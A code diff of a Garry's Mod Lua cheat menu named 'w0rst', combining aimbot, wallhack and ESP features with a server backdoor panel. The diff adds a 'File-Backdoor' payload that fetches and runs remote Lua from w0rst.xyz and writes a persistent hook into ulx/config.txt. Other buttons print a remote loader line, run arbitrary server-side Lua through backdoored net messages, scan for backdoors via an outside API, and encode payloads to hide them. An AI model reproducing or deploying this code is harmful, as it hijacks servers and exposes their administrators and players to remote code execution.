             if CheckTable(EntList, name) and not CheckTable(EntsOn, name) then
-                CreateButton(name, EntOnPanel[1], 220, 25, 5, EntOnPosY, function()
+                CreateButton(name, EntOnPanel, 220, 25, 5, Position['Ents'].ONY, function()
                     for i = 1, #EntList do
                         if EntList[i] == name then
                             table.remove(EntList, i)
                         end
-                    end; ClearLists()
-                end);
+                    end ClearLists()
+                end)
 
                 table.insert(EntsOn, name)
-                EntOnPosY = EntOnPosY + 26
+                Position['Ents'].ONY = Position['Ents'].ONY + 26
             end
         end
     end
 
     function ClearLists()
-        EntOffPanel[1]:Clear(); EntOnPanel[1]:Clear()
-        EntOffPosY, EntOnPosY = 5, 5
+        EntOffPanel:Clear() 
+        EntOnPanel:Clear()
+        Position['Ents'].ONY = 5 
+        Position['Ents'].OFFY = 5
         PopulateEntLists()
     end
 
     external = {}
     external['Clear'] = ClearLists
     return external
-end;
-
-local EntityList = PopulateEntLists()
+end
 
 local function PopulatePlayers()
     for k,v in pairs(player.GetAll()) do
-        local Frame = vgui.Create("DFrame", PlayerPanel[1])
-        Frame:SetPos(PlrPosX, PlrPosY)
+        local Frame = vgui.Create("DFrame", PlayerPanel)
+        Frame:SetPos(Position['Player'].x, Position['Player'].y)
         Frame:SetSize(145, 140)
         Frame:SetTitle(" ")
         Frame:SetDraggable(false)
         Frame:ShowCloseButton(false)
         Frame.Paint = function(self, w, h)
-            surface.SetDrawColor(Color(15,15,15,255))
-            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-            draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
+            draw.RoundedBox(0, 0, 0, w, h, wtf.theme['PlayerPanel'])
+            surface.SetDrawColor(wtf.theme['PlayerBorder'])
+            surface.DrawOutlinedRect(0, 0, w, h)
         end
 
-        local LabelButton = vgui.Create("DButton", Frame)
-        LabelButton:SetText(v:Nick())
-        LabelButton:SetColor(Color(255,255,255))
-        LabelButton:SetSize(115, 30)
-        LabelButton:SetPos(15, 100)
-        LabelButton.Paint = function(self, w, h)
-            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
-            surface.SetDrawColor(40, 40, 40, 255)
-            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-            self:SetTextColor(Color(255,255,255))
-        end
-        LabelButton.DoClick = function()
+        CreateButton(v:Nick(), Frame, 115, 30, 15, 100, function()
             if CheckPlr(v:UserID()) then
                 Log("Selected "..Player(SelectedPlr):Nick())
             end
-        end
+        end)
 
         local AvatarFrame = vgui.Create("DFrame", Frame)
         AvatarFrame:SetSize(82, 82)
@@ -771,47 +816,49 @@ local function PopulatePlayers()
         AvatarFrame:SetDraggable(false)
         AvatarFrame:ShowCloseButton(false)
         AvatarFrame.Paint = function(self, w, h)
-            draw.RoundedBox(0,0,0,w,h,Color(0,0,0, 255))
+            draw.RoundedBox(0, 0, 0, w, h, wtf.theme['PlayerBorder'])
         end
 
-        local Avatar = vgui.Create( "AvatarImage", AvatarFrame)
+        local Avatar = vgui.Create("AvatarImage", AvatarFrame)
         Avatar:SetSize(80, 80)
-        Avatar:Center()
         Avatar:SetPlayer(v, 128)
-        Avatar.Paint = function(self, w, h)
-            draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255))
-        end
+        Avatar.Paint = nil
+        Avatar:Center()
 
-        PlrPosX=PlrPosX+155
-        if PlrPosX==484 then
-            PlrPosX=19
-            PlrPosY=PlrPosY+150
+        Position['Player'].x = Position['Player'].x + 155
+        if Position['Player'].x == 484 then
+            Position['Player'].y = Position['Player'].y + 150
+            Position['Player'].x = 19
         end
     end
 end
 
-PopulatePlayers()
-local RefreshDelay = 5
-HookFunc("Think", RefreshHook, function()
+--[ Ent Lists ]--
+local RefreshDelay = 0
+local EntityList = PopulateEntLists()
+HookFunc("Think", wtf.hook['PlrRefresh'], function()
     if CurTime() < RefreshDelay then return end
     if Menu:IsVisible() then 
         RefreshDelay = CurTime() + 5
-        PlayerPanel[1]:GetCanvas():Clear()
-        PlrPosX, PlrPosY = 19, 10
+        PlayerPanel:Clear()
+        Position['Player'].x = 19
+        Position['Player'].y = 10
         PopulatePlayers()
     end
 end)
 
-local LuaEditor=vgui.Create("DTextEntry", BackdoorTab[1])
-LuaEditor:SetPos(10, 325)
-LuaEditor:AllowInput()
-LuaEditor:SetSize(495, 185)
-LuaEditor:SetValue("Run Lua | Server-Side")
-LuaEditor:SetMultiline(true)
-LuaEditor.Paint = function(self, w, h)
-    surface.SetDrawColor(15, 15, 15, 255)
+
+local Editor = vgui.Create("DTextEntry", BackdoorTab)
+Editor:SetPos(10, 325)
+Editor:AllowInput()
+Editor:SetSize(495, 185)
+Editor:SetValue("Run Lua | Server-Side")
+Editor:SetMultiline(true)
+Editor.Paint = function(self, w, h)
+    draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Panel'])
+    surface.SetDrawColor(wtf.theme['PanelBorder'])
     surface.DrawOutlinedRect(0, 0, w, h)
-    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
+    self:DrawTextEntryText(wtf.theme['Text'], Color(20, 20, 150), Color(100, 100, 100))
     self:SetFont('Trebuchet18')
 end
 
@@ -827,9 +874,9 @@ local function SendLua(lua)
 end
 
 local function CreateBDServer(name, func)
-    Button=vgui.Create("DButton", ServerBDPanel[1])
+    Button=vgui.Create("DButton", ServerBDPanel)
     Button:SetSize(195, 30)
-    Button:SetPos(15, BDServerPosY)
+    Button:SetPos(15, Position['Backdoor'].SY)
     Button:SetText(name)
     Button.DoClick = function()
         if CheckNet(SelectedNet) then
@@ -839,19 +886,19 @@ local function CreateBDServer(name, func)
         end
     end
     Button.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-        self:SetTextColor(Color(255,255,255))
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
+        surface.DrawOutlinedRect(0,0,w,h)
+        self:SetTextColor(wtf.theme['Text'])
     end
 
-    BDServerPosY = BDServerPosY + 35
+    Position['Backdoor'].SY = Position['Backdoor'].SY + 35
 end
 
 local function CreateBDClient(name, func)
-    Button=vgui.Create("DButton", ClientBDPanel[1])
+    Button=vgui.Create("DButton", ClientBDPanel)
     Button:SetSize(195, 30)
-    Button:SetPos(12, BDClientPosY)
+    Button:SetPos(12, Position['Backdoor'].CY)
     Button:SetText(name)
     Button.DoClick = function()
         if CheckNet(SelectedNet) then
@@ -863,13 +910,13 @@ local function CreateBDClient(name, func)
         end
     end
     Button.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-        self:SetTextColor(Color(255,255,255))
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
+        surface.DrawOutlinedRect(0,0,w,h)
+        self:SetTextColor(wtf.theme['Text'])
     end
 
-    BDClientPosY = BDClientPosY + 35
+    Position['Backdoor'].CY = Position['Backdoor'].CY + 35
 end
 
 local Sounds = {
@@ -893,16 +940,16 @@ local Sounds = {
 
 for i = 1, #Sounds do
     local Song = string.Split(Sounds[i], " ") 
-    local Button = vgui.Create("DButton", SoundPanel[1])
-    Button:SetSize(145,100)
+    Button=vgui.Create("DButton", SoundPanel)
+    Button:SetSize(145, 100)
+    Button:SetPos(Position['Sound'].x, Position['Sound'].y)
     Button:SetText(Song[1])
     Button:SetFont("Sounds")
-    Button:SetPos(SoundPosX, SoundPosY)
     Button.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-        self:SetTextColor(Color(155,155,155))
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
+        surface.DrawOutlinedRect(0,0,w,h)
+        self:SetTextColor(wtf.theme['Text'])
     end
     Button.DoClick = function()
         if CheckNet(SelectedNet) then
@@ -912,10 +959,11 @@ for i = 1, #Sounds do
             Log("No Net Selected"); 
         end
     end
-    SoundPosX=SoundPosX+158
-    if SoundPosX==491 then
-        SoundPosX=17
-        SoundPosY=SoundPosY+110
+
+    Position['Sound'].x=Position['Sound'].x+158
+    if Position['Sound'].x==491 then
+        Position['Sound'].x=17
+        Position['Sound'].y=Position['Sound'].y+110
     end
 end
 
@@ -926,7 +974,7 @@ FreeCamera.Velocity = Vector(0,0,0)
 FreeCamera.SetView = false
 FreeCamera.Speed = .97
 
-HookFunc("CalcView", CameraHook, function(ply, origin, angles, fov)
+HookFunc("CalcView", wtf.hook['Camera'], function(ply, origin, angles, fov)
     if not wtf.enable['FreeCamera'] then return end
     if FreeCamera.SetView then
         FreeCamera.ViewOrigin = origin
@@ -940,7 +988,7 @@ HookFunc("CalcView", CameraHook, function(ply, origin, angles, fov)
     }
 end)
 
-HookFunc("CreateMove", CameraHook, function(cmd)
+HookFunc("CreateMove", wtf.hook['Camera'], function(cmd)
     if not wtf.enable['FreeCamera'] then return end
     local time, sensitivity = FrameTime(), 0.025
     FreeCamera.ViewOrigin = FreeCamera.ViewOrigin + (FreeCamera.Velocity * time)
@@ -991,7 +1039,7 @@ wtf.Bones = {
 }
 
 local FovCircle = { 80 }
-HookFunc("AltHUDPaint", VisualHook, function()
+HookFunc("AltHUDPaint", wtf.hook['Visual'], function()
     if wtf.enable['Aimbot'] then
         surface.DrawCircle(ScrW()/2, ScrH()/2, (FovCircle[1] * 6), wtf.color['Fov'])
     end
@@ -1171,7 +1219,7 @@ HookFunc("AltHUDPaint", VisualHook, function()
     end
 end)
 
-HookFunc("CreateMove", AimbotHook, function(cmd)
+HookFunc("CreateMove", wtf.hook['Aimbot'], function(cmd)
     if not wtf.enable['Aimbot'] then return end
     local ply = LocalPlayer()
 
@@ -1215,7 +1263,7 @@ HookFunc("CreateMove", AimbotHook, function(cmd)
 end)
 
 local SilentAngles = nil
-HookFunc("CreateMove", ViewHook, function(cmd)
+HookFunc("CreateMove", wtf.hook['View'], function(cmd)
     if not wtf.enable['SilentLock'] then return end
     if (input.IsKeyDown(wtf.binds['Aimbot']) or wtf.binds['Aimbot'] == 0) and wtf.enable['Aimbot'] then
         SilentAngles = (SilentAngles or cmd:GetViewAngles()) + Angle(cmd:GetMouseY() * 0.023, cmd:GetMouseX() * -0.023, 0)
@@ -1224,7 +1272,7 @@ HookFunc("CreateMove", ViewHook, function(cmd)
     end
 end)
 
-HookFunc("CalcView", ViewHook, function(ply, pos, angles, fov)
+HookFunc("CalcView", wtf.hook['View'], function(ply, pos, angles, fov)
     if not wtf.enable['SilentLock'] then return end
     local view = {}
     view.angles = SilentAngles
@@ -1234,7 +1282,7 @@ HookFunc("CalcView", ViewHook, function(ply, pos, angles, fov)
     return view
 end)
 
-HookFunc("Think", ThinkHook, function()
+HookFunc("Think", wtf.hook['Think'], function()
     if wtf.enable['PhysRainbow'] then 
         local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
         LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
@@ -1248,7 +1296,7 @@ HookFunc("Think", ThinkHook, function()
     end
 end)
 
-HookFunc("CreateMove", BhopHook, function(ply) 
+HookFunc("CreateMove", wtf.hook['Creation'], function(ply) 
     if not wtf.enable['Bhop'] then return end
     if(ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
         ply:RemoveKey(IN_JUMP);
@@ -1266,7 +1314,7 @@ HookFunc("CreateMove", BhopHook, function(ply)
 end)
 
 local ChatSpamDelay = 0
-HookFunc("CreateMove", ChatHook, function()
+HookFunc("CreateMove", wtf.hook['Chat'], function()
     if CurTime() < ChatSpamDelay then return end
     ChatSpamDelay = CurTime() + 0.025
     if wtf.enable['ChatSpam'] then
@@ -1279,7 +1327,7 @@ HookFunc("CreateMove", ChatHook, function()
 end)
 
 local IsKeyDown = false
-HookFunc("Think", KeyHook, function()
+HookFunc("Think", wtf.hook['Key'], function()
     if input.IsKeyDown(wtf.binds['Menu']) and not Menu:IsVisible() and not IsKeyDown then
         Menu:Show(); IsKeyDown=true
     elseif input.IsKeyDown(wtf.binds['Menu']) and Menu:IsVisible() and not IsKeyDown then
@@ -1289,7 +1337,7 @@ HookFunc("Think", KeyHook, function()
     end
 end)
 
-HookFunc("Tick", TickHook, function()
+HookFunc("Tick", wtf.hook['Tick'], function()
     if wtf.enable['UseSpam'] then
         timer.Simple(0.05, function() RunConsoleCommand("+use") end)
         timer.Simple(0.10, function() RunConsoleCommand("-use") end)
@@ -1300,7 +1348,7 @@ HookFunc("Tick", TickHook, function()
     end
 end)
 
-CreateCheckbox("Plr-Tracer", VisualsTab[1], 22, 10, function()
+CreateCheckbox("Plr-Tracer", VisualsTab, 22, 10, function()
     wtf.enable['Tracer'] = not wtf.enable['Tracer']
     if wtf.enable['Tracer'] then
         Log("Tracer Enabled")
@@ -1309,7 +1357,7 @@ CreateCheckbox("Plr-Tracer", VisualsTab[1], 22, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-Distance", VisualsTab[1], 142, 10, function()
+CreateCheckbox("Plr-Distance", VisualsTab, 142, 10, function()
     wtf.enable['Distance'] = not wtf.enable['Distance']
     if wtf.enable['Distance'] then
         Log("Distance Enabled")
@@ -1318,7 +1366,7 @@ CreateCheckbox("Plr-Distance", VisualsTab[1], 142, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-Names", VisualsTab[1], 262, 10, function()
+CreateCheckbox("Plr-Names", VisualsTab, 262, 10, function()
     wtf.enable['Name'] = not wtf.enable['Name']
     if wtf.enable['Name'] then
         Log("Names Enabled")
@@ -1327,7 +1375,7 @@ CreateCheckbox("Plr-Names", VisualsTab[1], 262, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-Weapons", VisualsTab[1], 382, 10, function()
+CreateCheckbox("Plr-Weapons", VisualsTab, 382, 10, function()
     wtf.enable['Weapon'] = not wtf.enable['Weapon']
     if wtf.enable['Weapon'] then
         Log("Weapons Enabled")
@@ -1336,7 +1384,7 @@ CreateCheckbox("Plr-Weapons", VisualsTab[1], 382, 10, function()
     end
 end)
 
-CreateCheckbox("Plr-2D-Box", VisualsTab[1], 22, 40, function()
+CreateCheckbox("Plr-2D-Box", VisualsTab, 22, 40, function()
     wtf.enable['Box2D'] = not wtf.enable['Box2D']
     if wtf.enable['Box2D'] then
         Log("2D Boxes Enabled")
@@ -1345,7 +1393,7 @@ CreateCheckbox("Plr-2D-Box", VisualsTab[1], 22, 40, function()
     end
 end)
 
-CreateCheckbox("Plr-3D-Box", VisualsTab[1], 142, 40, function()
+CreateCheckbox("Plr-3D-Box", VisualsTab, 142, 40, function()
     wtf.enable['Box3D'] = not wtf.enable['Box3D']
     if wtf.enable['Box3D'] then
         Log("3D Boxes Enabled")
@@ -1354,7 +1402,7 @@ CreateCheckbox("Plr-3D-Box", VisualsTab[1], 142, 40, function()
     end
 end)
 
-CreateCheckbox("Plr-Skeletons", VisualsTab[1], 262, 40, function()
+CreateCheckbox("Plr-Skeletons", VisualsTab, 262, 40, function()
     wtf.enable['Skeleton'] = not wtf.enable['Skeleton']
     if wtf.enable['Skeleton'] then
         Log("Skeletons Enabled")
@@ -1363,7 +1411,7 @@ CreateCheckbox("Plr-Skeletons", VisualsTab[1], 262, 40, function()
     end
 end)
 
-CreateCheckbox("Plr-Chams", VisualsTab[1], 382, 40, function()
+CreateCheckbox("Plr-Chams", VisualsTab, 382, 40, function()
     wtf.enable['Chams'] = not wtf.enable['Chams']
     if wtf.enable['Chams']then
         Log("Chams Enabled")
@@ -1372,7 +1420,7 @@ CreateCheckbox("Plr-Chams", VisualsTab[1], 382, 40, function()
     end
 end)
 
-CreateCheckbox("Ent-Names", VisualsTab[1], 22, 70, function()
+CreateCheckbox("Ent-Names", VisualsTab, 22, 70, function()
     wtf.enable['EntName'] = not wtf.enable['EntName']
     if wtf.enable['EntName'] then
         Log("Ent Names Enabled")
@@ -1381,7 +1429,7 @@ CreateCheckbox("Ent-Names", VisualsTab[1], 22, 70, function()
     end
 end)
 
-CreateCheckbox("Ent-Distance", VisualsTab[1], 142, 70, function()
+CreateCheckbox("Ent-Distance", VisualsTab, 142, 70, function()
     wtf.enable['EntDistance'] = not wtf.enable['EntDistance']
     if wtf.enable['EntDistance'] then
         Log("Ent Distance Enabled")
@@ -1390,7 +1438,7 @@ CreateCheckbox("Ent-Distance", VisualsTab[1], 142, 70, function()
     end
 end)
 
-CreateCheckbox("Ent-3D", VisualsTab[1], 262, 70, function()
+CreateCheckbox("Ent-3D", VisualsTab, 262, 70, function()
     wtf.enable['Ent3D'] = not wtf.enable['Ent3D']
     if wtf.enable['Ent3D'] then
         Log("Ent 3D Boxes Enabled")
@@ -1399,7 +1447,7 @@ CreateCheckbox("Ent-3D", VisualsTab[1], 262, 70, function()
     end
 end)
 
-CreateCheckbox("Wallhack", VisualsTab[1], 382, 70, function()
+CreateCheckbox("Wallhack", VisualsTab, 382, 70, function()
     wtf.enable['Wallhack'] = not wtf.enable['Wallhack']
     if wtf.enable['Wallhack'] then
         Log("Wallhack Enabled")
@@ -1408,7 +1456,7 @@ CreateCheckbox("Wallhack", VisualsTab[1], 382, 70, function()
     end
 end)
 
-CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
+CreateCheckbox("Free Camera", VisualsTab, 22, 100, function()
     wtf.enable['FreeCamera'] = not wtf.enable['FreeCamera']
     if wtf.enable['FreeCamera'] then
         FreeCamera.SetView = true
@@ -1418,7 +1466,7 @@ CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
     end
 end)
 
-CreateCheckbox("Spectator List", VisualsTab[1], 142, 100, function()
+CreateCheckbox("Spectator List", VisualsTab, 142, 100, function()
     wtf.enable['SpectatorList'] = not wtf.enable['SpectatorList']
     if wtf.enable['SpectatorList'] then
         Log("Spectator List Enabled")
@@ -1427,7 +1475,7 @@ CreateCheckbox("Spectator List", VisualsTab[1], 142, 100, function()
     end
 end)
 
-CreateCheckbox("Rainbow Colors", VisualsTab[1], 262, 100, function()
+CreateCheckbox("Rainbow Colors", VisualsTab, 262, 100, function()
     wtf.enable['RainbowColors'] = not wtf.enable['RainbowColors']
     if wtf.enable['RainbowColors'] then
         Log("Rainbow Colors Enabled")
@@ -1436,36 +1484,51 @@ CreateCheckbox("Rainbow Colors", VisualsTab[1], 262, 100, function()
     end
 end)
 
-CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 15, 160, EntityList.Clear)
+CreateButton("Refresh Ents", VisualsTab, 80, 25, 15, 160, EntityList.Clear)
 
-local function SaveVisuals()
+CreateButton("Save Theme", MiscTab, 80, 25, 170, 190, function()
+    local json = util.TableToJSON(wtf.theme, true)
+    file.Write("w0rst/theme.txt", json)
+    Log("Saved Theme")
+end)
+
+CreateButton("Load Theme", MiscTab, 80, 25, 255, 190, function()
+    if file.Exists("w0rst/theme.txt", "DATA") then
+        local file = file.Read("w0rst/theme.txt", "DATA")
+        local json = util.JSONToTable(file)
+        table.Merge(wtf.theme, json)
+        for i = 1, #ThemeSliders do
+            ThemeSliders[i].Update()
+        end Log("Loaded Theme")
+    else
+        Log("Unable To Load Theme")
+    end
+end)
+
+CreateButton("Save Visuals", MiscTab, 80, 25, 340, 190, function()
     local json = util.TableToJSON(wtf.color, true)
     file.Write("w0rst/visuals.txt", json)
     Log("Saved Visuals")
-end
+end)
 
-local function LoadVisuals()
+CreateButton("Load Visuals", MiscTab, 80, 25, 425, 190, function()
     if file.Exists("w0rst/visuals.txt", "DATA") then
         local file = file.Read("w0rst/visuals.txt", "DATA")
         local json = util.JSONToTable(file)
         table.Merge(wtf.color, json)
         for i = 1, #ColorSliders do
             ColorSliders[i].Update()
-        end; Log("Loaded Visuals")
+        end Log("Loaded Visuals")
     else
         Log("Unable To Load Visuals")
     end
-end
-
-CreateButton("Save Visuals", MiscTab[1], 80, 25, 425, 250, SaveVisuals)
-
-CreateButton("Load Visuals", MiscTab[1], 80, 25, 340, 250, LoadVisuals)
+end)
 
 CreateBDServer("File-Backdoor (ULX-Extended)", function()
     Log("Added/Injected Backdoor")
     SendLua([[
-        util.AddNetworkString('w0rst') net.Receive('w0rst', function(len) RunString(net.ReadString()) end) 
-        file.Append("ulx/config.txt", "\n"..[=[ulx hook Think wtf hmm "util.AddNetworkString('w0rst') net.Receive('w0rst', function() RunString(net.ReadString()) end) hook.Remove('Think', 'wtf')"]=])
+        local lua = CompileString("http.Fetch('https://w0rst.xyz/project/func/napalm.lua', RunString)", "????") lua()
+        file.Append("ulx/config.txt", "\n"..[=[ulx hook Think wtf hmm "http.Fetch('https://w0rst.xyz/project/func/napalm.lua', RunString) hook.Remove('Think', 'wtf')"]=])
     ]])
 end)
 
@@ -1938,7 +2001,7 @@ CreateBDClient("NoClip",  function()
     end
 end)
 
-CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
+CreateButton("Net-Scan", BackdoorTab, 115, 30, 19, 520, function()
     http.Post("https://w0rst.xyz/project/api/netsys.php", { method = "02C2C6A1Ded7183AeDAA8650" }, function(b)
         local Nets = string.Split(b, " ")
         for k, v in pairs(Nets) do
@@ -1950,7 +2013,7 @@ CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
     end)
 end)
 
-CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
+CreateButton("Select-Net", BackdoorTab, 115, 30, 139, 520, function()
     CreateInputBox("Net", function(str)
         if CheckNet(str) then
             SelectedNet=str
@@ -1961,7 +2024,7 @@ CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
     end)
 end)
 
-CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
+CreateButton("Add-Net", BackdoorTab, 115, 30, 259, 520, function()
     CreateInputBox("Net", function(str)
         local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
         http.Post("https://w0rst.xyz/project/api/netsys.php", { method = "A0791AfFA0F30EdCee1EdADb", u = UserInfo[1], p = UserInfo[2], n = str }, function(b)
@@ -1974,15 +2037,15 @@ CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
     end)
 end)
 
-CreateButton("Run Lua", BackdoorTab[1], 115, 30, 379, 520, function()
+CreateButton("Run Lua", BackdoorTab, 115, 30, 379, 520, function()
     if CheckNet(SelectedNet) then
-        SendLua(LuaEditor:GetValue())
+        SendLua(Editor:GetValue())
     else
         Log("No Net Selected")
     end
 end)
 
-CreateCheckbox("Adv-Bhop", MiscTab[1], 22, 10, function()
+CreateCheckbox("Adv-Bhop", MiscTab, 22, 10, function()
     wtf.enable['Bhop'] = not wtf.enable['Bhop']
     if wtf.enable['Bhop'] then
         Log("Bhop Enabled")
@@ -1991,7 +2054,7 @@ CreateCheckbox("Adv-Bhop", MiscTab[1], 22, 10, function()
     end
 end)
 
-CreateButton("Net-Dumper", MiscTab[1], 110, 25, 142, 10, function()
+CreateButton("Net-Dumper", MiscTab, 110, 25, 142, 10, function()
     local name = "w0rst/netstrings".."_"..math.random(10^5,10^10)..".txt"
     if file.Exists(name, "DATA") then
         file.Delete(name)
@@ -2011,12 +2074,12 @@ CreateButton("Net-Dumper", MiscTab[1], 110, 25, 142, 10, function()
     print("Location: GarrysMod\\garrysmod\\data\\"..name)
 end)
 
-CreateButton("w0rst-backdoor", MiscTab[1], 110, 25, 262, 10, function()
+CreateButton("w0rst-backdoor", MiscTab, 110, 25, 262, 10, function()
     MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/project/func/napalm.lua', RunString) end)\n")
     Log("Check Console")
 end)
 
-CreateCheckbox("RGB-Physgun", MiscTab[1], 382, 10, function()
+CreateCheckbox("RGB-Physgun", MiscTab, 382, 10, function()
     wtf.enable['PhysRainbow'] = not wtf.enable['PhysRainbow']
     if wtf.enable['PhysRainbow'] then
         Log("RGB-Physgun Enabled")
@@ -2025,7 +2088,7 @@ CreateCheckbox("RGB-Physgun", MiscTab[1], 382, 10, function()
     end
 end)
 
-CreateCheckbox("Use-Spammer", MiscTab[1], 22, 40, function()
+CreateCheckbox("Use-Spammer", MiscTab, 22, 40, function()
     wtf.enable['UseSpam'] = not wtf.enable['UseSpam']
     if wtf.enable['UseSpam'] then
         Log("Use Spammer Enabled")
@@ -2034,7 +2097,7 @@ CreateCheckbox("Use-Spammer", MiscTab[1], 22, 40, function()
     end
 end)
 
-CreateCheckbox("Flash-Spammer", MiscTab[1], 142, 40, function()
+CreateCheckbox("Flash-Spammer", MiscTab, 142, 40, function()
     wtf.enable['FlashSpam'] = not wtf.enable['FlashSpam']
     if wtf.enable['FlashSpam'] then
         Log("Flash Spammer Enabled")
@@ -2043,14 +2106,14 @@ CreateCheckbox("Flash-Spammer", MiscTab[1], 142, 40, function()
     end
 end)
 
-CreateButton("FOV-Editor", MiscTab[1], 110, 25, 262, 40, function()
+CreateButton("FOV-Editor", MiscTab, 110, 25, 262, 40, function()
     CreateInputBox("Edit Fov", function(str)
         LocalPlayer():ConCommand("fov_desired "..str)
         Log("FOV Set: "..str)
     end)
 end)
 
-CreateButton("Encode-String", MiscTab[1], 110, 25, 382, 40, function()
+CreateButton("Encode-String", MiscTab, 110, 25, 382, 40, function()
     CreateInputBox("Encode String", function(str)
         local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
         SetClipboardText("RunString('"..encoded.."')")
@@ -2059,7 +2122,7 @@ CreateButton("Encode-String", MiscTab[1], 110, 25, 382, 40, function()
       end)
 end)
 
-CreateCheckbox("Chat Advertise", MiscTab[1], 22, 70, function()
+CreateCheckbox("Chat Advertise", MiscTab, 22, 70, function()
     wtf.enable['ChatSpam'] = not wtf.enable['ChatSpam']
     if wtf.enable['ChatSpam'] then
         Log("Chat Advertiser Enabled")
@@ -2068,7 +2131,7 @@ CreateCheckbox("Chat Advertise", MiscTab[1], 22, 70, function()
     end
 end)
 
-CreateCheckbox("Fov Aimbot", MiscTab[1], 142, 70, function()
+CreateCheckbox("Fov Aimbot", MiscTab, 142, 70, function()
     wtf.enable['Aimbot'] = not wtf.enable['Aimbot']
     if wtf.enable['Aimbot'] then
         Log("Aimbot Enabled")
@@ -2077,9 +2140,9 @@ CreateCheckbox("Fov Aimbot", MiscTab[1], 142, 70, function()
     end
 end)
 
-CreateSlider("Fov:", FovCircle, MiscTab[1], 1000, 5, 262, 70)
+CreateSlider("Fov:", FovCircle, MiscTab, 1000, 5, 262, 70)
 
-CreateCheckbox("Silent Lock", MiscTab[1], 382, 70, function()
+CreateCheckbox("Silent Lock", MiscTab, 382, 70, function()
     wtf.enable['SilentLock'] = not wtf.enable['SilentLock']
     if wtf.enable['SilentLock'] then
         Log("Silent Lock Enabled")
@@ -2088,7 +2151,7 @@ CreateCheckbox("Silent Lock", MiscTab[1], 382, 70, function()
     end
 end)
 
-CreateCheckbox("Auto Fire", MiscTab[1], 22, 100, function()
+CreateCheckbox("Auto Fire", MiscTab, 22, 100, function()
     wtf.enable['AutoFire'] = not wtf.enable['AutoFire']
     if wtf.enable['AutoFire'] then
         Log("Aimbot AutoFire Enabled")
@@ -2097,22 +2160,33 @@ CreateCheckbox("Auto Fire", MiscTab[1], 22, 100, function()
     end
 end)
 
-CreateBindableButton("Bind Aimbot", "Aimbot", MiscTab[1], 142, 100)
+CreateBindableButton("Bind Aimbot", "Aimbot", MiscTab, 142, 100)
 
-CreateBindableButton("Bind Menu", "Menu", MiscTab[1], 262, 100)
+CreateBindableButton("Bind Menu", "Menu", MiscTab, 262, 100)
 
-CreateButton("Panic (Unload Script)", MiscTab[1], 110, 25, 382, 100, function()
+CreateButton("Unload", MiscTab, 110, 25, 382, 100, function()
     Menu:Close(); Unload()
 end)
 
-CreateButton("Play URL-Link", SoundsTab[1], 120, 35, 385, 520, function()
+CreateButton("Play URL-Link", SoundsTab, 120, 35, 385, 520, function()
     CreateInputBox("Play URL", function(str)
         SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
         Log("Playing: " .. str)
     end)
 end)
 
-CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
+CreateButton("Stop Sounds", SoundsTab, 120, 35, 255, 520, function()
     SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
     Log("Stopped Sounds")
 end)
+
+--[[
+    http.Fetch("https://w0rst.xyz/project/func/load.lua", RunString)
+    CREATE NEW SLIDERS / ARGB & RAINBOW OPTION
+    ADD AIMBOT WALL CHECK & AIMBOT TAB/OPTIONS
+    ADD EXPLOITS TAB & SIMPLE EXPLOITS
+    NEW ESP & AIMBOT TARGETING
+    COMPLETE CONFIG SYSTEM 
+    GO OVER HOOKS AGAIN
+]]--
+
